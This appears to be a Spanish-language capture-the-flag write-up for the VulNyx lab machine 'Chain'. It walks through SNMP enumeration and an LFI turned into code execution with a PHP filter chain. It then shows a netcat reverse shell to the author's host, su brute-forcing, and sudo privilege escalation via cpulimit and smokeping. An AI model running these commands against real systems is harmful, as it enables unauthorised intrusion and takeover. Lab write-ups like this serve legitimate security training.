@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">VulNyx - Chain | noname</title>
+<meta property="og:title" content="VulNyx - Chain | noname" />
+<meta name="twitter:title" content="VulNyx - Chain | noname" />
+<meta itemprop="name" content="VulNyx - Chain | noname" />
+<meta name="application-name" content="VulNyx - Chain | noname" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Writeup Chain 🟡">
+<meta itemprop="description" content="Writeup Chain 🟡" />
+<meta property="og:description" content="Writeup Chain 🟡" />
+<meta name="twitter:description" content="Writeup Chain 🟡" />
+
+<meta property="og:locale" content="es" />
+<meta name="language" content="es" />
+
+  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/nyx/chain/" title="" />
+
+
+
+  <meta itemprop="image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta property="og:image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta name="twitter:image" content="https://0x-noname.github.io/images/logo.webp" />
+  <meta name="twitter:image:src" content="https://0x-noname.github.io/images/logo.webp" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-08-16T17:00:42&#43;0200 />
+    <meta property="article:published_time" content=2023-08-16T17:00:42&#43;0200 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "VulNyx - Chain",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-08-16",
+        "description": "Writeup Chain 🟡",
+        "wordCount":  698 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-08-16",
+        "image": {
+        "@type": "imageObject",
+        "url": "\/images\/logo.webp"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "noname"
+        }
+    }
+    </script>
+
+
+
+<meta name="generator" content="Hugo 0.125.7">
+
+    
+
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/chain/">
+    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+  
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0x-noname.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        $ home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackmyvm/">
+                        $ hmv
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackthebox/">
+                        $ htb
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/vulnyx/">
+                        $ nyx
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        $ whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">VulNyx - Chain</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-08-16T17:00:42&#43;02:00" itemprop="datePublished"> Aug 16, 2023 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img src="/../machines/nyx/chain/chain_logo.webp" alt="logo"></p>
+<ul>
+<li><em>SNMP Enumeration Information Leakage</em></li>
+<li><em>PHP Filter Chain</em></li>
+<li><em>Brute Force su Binary</em></li>
+<li><em>Abuse cpulimit Binary</em></li>
+<li><em>Abuse smokeping Binary</em></li>
+</ul>
+<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -v -T5 -n 192.168.1.43
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -v -p 80 192.168.1.43
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Supported Methods: OPTIONS HEAD GET POST
+</span></span><span class="line"><span class="cl">|_http-title: Chain
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.56 (Debian)
+</span></span></code></pre></div><h3 id="http---tcp-80">HTTP - TCP 80</h3>
+<p><img src="/../machines/nyx/chain/http.webp" alt="http"></p>
+<p>Si me descargo la imagen y le paso la herramienta <strong>strings</strong> se puede apreciar una llave <strong>rsa</strong> pero se trata de un <code>rabbit_hole</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ strings -n 6 chain.png
+</span></span><span class="line"><span class="cl">%&amp;&#39;()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+</span></span><span class="line"><span class="cl">&amp;&#39;()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">Proc-Type: 4,ENCRYPTED
+</span></span><span class="line"><span class="cl">DEK-Info: DES-EDE3-CBC,92E78A581F3E1F25
+</span></span><span class="line"><span class="cl">pLzUnqFfRfhNyMnFWUQJj0+h6ctKAR0G83+8TCL7X8H571/20pdIDmQtLVut5Che
+</span></span><span class="line"><span class="cl">n3RZu7O1xq8SK5G6ivVj3JtrijV5M541c90dp6I1V1dkg/+iYIOEich7VXj/uZ8n
+</span></span><span class="line"><span class="cl">RgQRpgAompw4EEC/+Q8WhvPadl/6syW1+UvlZlzV0mAlYQxDVF/PiJDoxt7QBXVF
+</span></span><span class="line"><span class="cl">UQ1Oma+4D/E1EL9PxWYfcqmEZRavN3FdCQ8DNiApBXWRwUkina2G+dkZBkZJhroh
+</span></span><span class="line"><span class="cl">t+YnSTOv/ls+//Xb2xoovj8n3fI6jG7VLCeXY3GuxZTqAkT5yG5iC3qvszeb411f
+</span></span><span class="line"><span class="cl">nlGjkcUTHYLjVC/zuyz01zOJTw0gYiss7eMdl3arOvV1Da0qkov2o1ht1R+gEa/c
+</span></span><span class="line"><span class="cl">COhaYjNoBdFKLzGr7Xf8RfqouIgL8IrIe50q3jar+S5Z5M4D1pKdEWlAUjP2ais7
+</span></span><span class="line"><span class="cl">MUk8hk2gq0IuGEbwDG7JRXOSbbMM4FGYU3Ot4g1eFbjTTYUS91/jGrufUpw9Ec+6
+</span></span><span class="line"><span class="cl">l4K5Ee5uZeIio4rMwcdqinA9rvgfYJiHZ5q9Di/MW9T/7HQVYWCEEXngILpDwVlK
+</span></span><span class="line"><span class="cl">sEwUcqAMCObxYBG0FEc2IV4dnMIDTuRFJoNy9sWifKEnNM1TnBhUyYDZFaJNEiRP
+</span></span><span class="line"><span class="cl">JGT9vmDRqlQYQQvqPmf+uoYkH554OFYEbUhjNgULO7k2NLD0+0i5nU4zVMwg1Btc
+</span></span><span class="line"><span class="cl">SjBLIMmyYpj5RT/U8DZiefCWbyYCkz6BwyvGiUBGlGIbWTM5fCajqOhUSsh0616C
+</span></span><span class="line"><span class="cl">xCOuftFjPI4AaRTEb+hSQAvKq6ePvw6ErmrUJK2xOMW6U6CLTbWXhRJ3grR7MXUV
+</span></span><span class="line"><span class="cl">BWZyrPHRntGiLNqX+ZH/M7JRZegvY2uhMPmPeq7hH9x/UqIghvYilKEqruui4j73
+</span></span><span class="line"><span class="cl">EGiJRBD9h7buEispZoLhXZmgw3XmHqOPC+oCK4XCrXqRaOSrN2X/ufyhyLvO+CsK
+</span></span><span class="line"><span class="cl">rMAJnifHZBkUq1HXU1BmEcK4eBPXRq/RZsvKgPiswZjYQOwjx36+rvts6wb5XRyY
+</span></span><span class="line"><span class="cl">l29jefPpaWw7eCZbfA+9Czi2PTpLd2WOKhOl0Lq3kgdZ+NCTkVKCD3Ortbx9UNJZ
+</span></span><span class="line"><span class="cl">aCXj/iaCFBFWcs7JUCW/go1jyucRjAhcPhynD+6QkV7E8i1fgTAEzmhJhybxVlb9
+</span></span><span class="line"><span class="cl">RXiC7qk7LpQM/TMf2VoX7Bt1t/Gx/Afblfz3H6xtCyuMlkCHXdius7z121BzY9D6
+</span></span><span class="line"><span class="cl">PytF26BXw6vM29wOzxkLtX0TT0a+6A2GSiH19qnEcwWqsy6XrYrcIgVtzGyepMPL
+</span></span><span class="line"><span class="cl">ggIxeKc8W32N2wn73zAI7Oa1DyQFlVfF+Ve0ObYKDpIMhwa0q+9q0AwLWDq3SG2m
+</span></span><span class="line"><span class="cl">a1osxjpqh0Puy+XlStMuIN234LupUR6Q/A7UoSbZosIMhBoyLWNH0pYr36kLApcC
+</span></span><span class="line"><span class="cl">YTnAhcvTzAs/jdPSo5Qze6U4G8G0MDRstUEugfvoEoEf+iZkBJEvYlOQc7Sc2vdC
+</span></span><span class="line"><span class="cl">qd+4B2iD0e5kBvUxmiNmTiC+9xP1oi5Z2PR28bcGy7JWj3yQ8ra4YKP1PLbmY1yq
+</span></span><span class="line"><span class="cl">MwqyWhIV0Hv1iSp8iEXWwRX/BuQH5nbHWgkzykGQkEp8c2M2op0CaA==
+</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY-----
+</span></span></code></pre></div><p>Después realizar fuerza bruta de directorios y extensiones sin encontrar nada vuelvo a escanear la máquina en búsca de puertos <strong>UDP</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sU --top-ports 100 192.168.1.43
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE         SERVICE
+</span></span><span class="line"><span class="cl">161/udp open          snmp
+</span></span></code></pre></div><h3 id="snmp---udp-161">SNMP - UDP 161</h3>
+<p>Lanzo <strong>onesixtyone</strong> y encuentro la comunity string <strong>security</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.43
+</span></span><span class="line"><span class="cl">Scanning 1 hosts, 3219 communities
+</span></span><span class="line"><span class="cl">192.168.1.43 [security] Linux chain 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
+</span></span></code></pre></div><p>Con snmpwalk enumero información de la máquina y encuentro el dominio <code>chaincorp.nyx</code> y el usuario <strong>blue</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ snmpwalk -v2c -c security 192.168.1.43
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.1.0 = STRING: &#34;Linux chain 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.3.0 = Timeticks: (108255) 0:18:02.55
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.4.0 = STRING: &#34;Blue &lt;blue@chaincorp.nyx&gt;&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.5.0 = STRING: &#34;Chain&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.6.0 = STRING: &#34;VulNyx.com&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.8.0 = Timeticks: (9) 0:00:00.09
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
+</span></span></code></pre></div><p>Añado el dominio al archivo hosts y realizo una enumeración de subdominios.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ gobuster vhost -u chaincorp.nyx -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Gobuster v3.5
+</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">[+] Url:             http://chaincorp.nyx
+</span></span><span class="line"><span class="cl">[+] Method:          GET
+</span></span><span class="line"><span class="cl">[+] Threads:         10
+</span></span><span class="line"><span class="cl">[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</span></span><span class="line"><span class="cl">[+] User Agent:      gobuster/3.5
+</span></span><span class="line"><span class="cl">[+] Timeout:         10s
+</span></span><span class="line"><span class="cl">[+] Append Domain:   true
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">2023/08/15 19:53:15 Starting gobuster in VHOST enumeration mode
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Found: utils.chaincorp.nyx Status: 200 [Size: 628]
+</span></span></code></pre></div><p>Añado el nuevo subdominio al archivo hosts y al visitar el subdominio veo lo siguiente.</p>
+<p><img src="/../machines/nyx/chain/subdomain.webp" alt="subdomain"></p>
+<p>Archivo <code>id.php</code>.</p>
+<p><img src="/../machines/nyx/chain/id.webp" alt="id"></p>
+<p>Archivo <code>ip.php</code>.</p>
+<p><img src="/../machines/nyx/chain/ip.webp" alt="ip"></p>
+<p>Con metodología básica encuentro un LFI.</p>
+<p><img src="/../machines/nyx/chain/lfi.webp" alt="lfi"></p>
+<p>Mediante wrappers puedo leer el contenido del archivo <code>include.php</code> y resto de archivos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl &#39;http://utils.chaincorp.nyx/include.php?in=php://filter/convert.base64-encode/resource=include.php&#39;
+</span></span><span class="line"><span class="cl">&lt;pre&gt;
+</span></span><span class="line"><span class="cl">PHByZT4KPD9waHAKICAkZmlsZSA9ICRfR0VUWyJpbiJdOwogIGlmKGlzc2V0KCRmaWxlKSkKICB7CiAgICBpbmNsdWRlKCIkZmlsZSIpOwogIH0KPz4KPC9wcmU+Cg==&lt;/pre&gt;
+</span></span></code></pre></div><p>Una vez obtengo la cadena en base64 la decodifico y puedo leer el contenido de <code>include.php</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ echo &#34;PHByZT4KPD9waHAKICAkZmlsZSA9ICRfR0VUWyJpbiJdOwogIGlmKGlzc2V0KCRmaWxlKSkKICB7CiAgICBpbmNsdWRlKCIkZmlsZSIpOwogIH0KPz4KPC9wcmU+Cg==&#34; | base64 -d
+</span></span><span class="line"><span class="cl">&lt;pre&gt;
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">  $file = $_GET[&#34;in&#34;];
+</span></span><span class="line"><span class="cl">  if(isset($file))
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    include(&#34;$file&#34;);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;/pre&gt;
+</span></span></code></pre></div><p>Sabiendo esto, existe un método para obtener RCE a partir de un LFI conocida como <a href="https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/">Filter Chain</a>. Me descargo la herramienta y genero una cadena con el comando <code>ls -la</code>.</p>
+<p><img src="/../machines/nyx/chain/chain_g_ls.webp" alt="chain_g_ls"></p>
+<p>Copio el churraco, lo pego en el navegador y puedo comprobar que funciona correctamente.</p>
+<p><img src="/../machines/nyx/chain/chain_RCE.webp" alt="chain_RCE"></p>
+<p>Al tener ejecución de comandos genero una cadena con los siguientes parámetros.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">❯</span> <span class="o">./</span><span class="n">php_filter_chain_generator</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">chain</span> <span class="s1">&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span>
+</span></span></code></pre></div><p><img src="/../machines/nyx/chain/chain_g_cmd.webp" alt="chain_g_cmd"></p>
+<p>Al final de la cadena generada, después de <code>php://temp</code>  añado el parámetro <strong>cmd</strong> para que me lanze un <strong>netcat</strong> a mi equipo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&amp;cmd=nc%20-c%20/bin/bash%20192.168.1.18%204444
+</span></span></code></pre></div><p>Obtengo la shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvnp 4444
+</span></span><span class="line"><span class="cl">listening on [any] 4444 ...
+</span></span><span class="line"><span class="cl">connect to [192.168.1.18] from (UNKNOWN) [192.168.1.43] 57124
+</span></span><span class="line"><span class="cl">script /dev/null -c bash
+</span></span><span class="line"><span class="cl">Script started, output log file is &#39;/dev/null&#39;.
+</span></span><span class="line"><span class="cl">www-data@chain:/var/www/vhost$ id
+</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></div><p>Para pivotar de <strong>www-data</strong> a <strong>blue</strong> me descargo la herramienta <a href="https://github.com/d4t4s3c/suForce.git">suForce</a> en la máquia víctima.</p>
+<p><img src="/../machines/nyx/chain/suForceBlue.webp" alt="suForceBlue"></p>
+<p>Me conecto como usuario <strong>blue</strong> y enumero permisos de sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">blue@chain:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for blue on chain:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User blue may run the following commands on chain:
+</span></span><span class="line"><span class="cl">    (red) NOPASSWD: /usr/bin/cpulimit
+</span></span></code></pre></div><p>Para pivotar de <strong>blue</strong> a <strong>red</strong> he usado este recurso <a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo">gtfobins</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">blue@chain:~$ sudo -u red cpulimit -l 100 -f /bin/bash
+</span></span><span class="line"><span class="cl">red@chain:/home/blue$ id
+</span></span><span class="line"><span class="cl">uid=1001(red) gid=1001(red) grupos=1001(red)
+</span></span></code></pre></div><p>Enumero de nuevo permisos de sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">red@chain:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for red on chain:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User red may run the following commands on chain:
+</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /usr/sbin/smokeping
+</span></span></code></pre></div><p>Para obtener el root uso la flag <strong>&ndash;man</strong> de la herramienta.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">red@chain:~$ sudo /usr/sbin/smokeping --man
+</span></span></code></pre></div><p>Escribo <code>!/bin/bash</code> y obtengo el root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">red@chain:~$ sudo /usr/sbin/smokeping --man
+</span></span><span class="line"><span class="cl">You need to install the perl-doc package to use this program.
+</span></span><span class="line"><span class="cl">root@chain:/home/red# id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) grupos=0(root)
+</span></span></code></pre></div><p>Y con esto ya tenemos resuelta la máquina Chain.</p>
+<p>Saludos!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 .
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
